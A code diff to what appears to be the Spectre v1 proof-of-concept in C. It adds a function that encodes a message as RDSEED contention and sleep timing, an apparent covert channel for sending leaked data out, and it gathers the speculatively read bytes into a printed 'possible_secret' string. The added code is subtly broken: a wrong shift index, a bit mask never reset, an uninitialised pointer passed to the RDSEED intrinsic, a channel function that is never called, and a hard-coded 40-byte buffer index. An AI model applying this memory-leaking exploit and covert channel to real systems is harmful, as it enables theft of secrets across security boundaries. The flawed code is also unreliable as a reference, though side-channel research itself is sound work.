@@ -1,6 +1,9 @@
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
+#include <immintrin.h> // for rdseed
+#include <unistd.h> // for usleep
 #ifdef _MSC_VER
 #include <intrin.h> /* for rdtscp and clflush */
 #pragma optimize("gt", on)
@@ -106,6 +109,31 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
     score[1] = results[k];
 }
 
+void rng_send(char * msg) {
+    // send the data contained in the array 'msg' through the rng conditioner
+    int len = strnlen(msg, 255);
+    int i, j;
+    int x = 0x80;
+
+    for (i = 0; i < len; i++) {
+        for (j = 0; j < 8; j++) {
+            // do the rdseed or don't
+            if (((msg[i] & x) >> (7 - i)) == 1) {
+                unsigned long long * p;
+                int k, ret;
+                for (k = 0; k < 256; k++) {
+                    ret = _rdseed64_step(p);
+                }
+                usleep(10000);
+            }
+            else {
+                usleep(100000);
+            }
+            x /= 2;
+        }
+    }
+}
+
 int main(int argc, const char ** argv) {
     size_t malicious_x =
         (size_t) (secret - (char *) array1); /* default for malicious_x */
@@ -122,6 +150,7 @@ int main(int argc, const char ** argv) {
         sscanf(argv[1], "%d", &len);
     }
 
+    char possible_secret[41] = {0};
     printf("Reading %d bytes:\n", len);
     while (--len >= 0) {
         printf("Reading at malicious_x = %p... ", (void *) malicious_x);
@@ -133,7 +162,9 @@ int main(int argc, const char ** argv) {
             printf("(second best: 0x%02X score=%d)", value[1], score[1]);
         }
         printf("\n");
+        possible_secret[39-len] = value[0];
     }
+    printf("%s\n", possible_secret);
     return(0);
 }
 
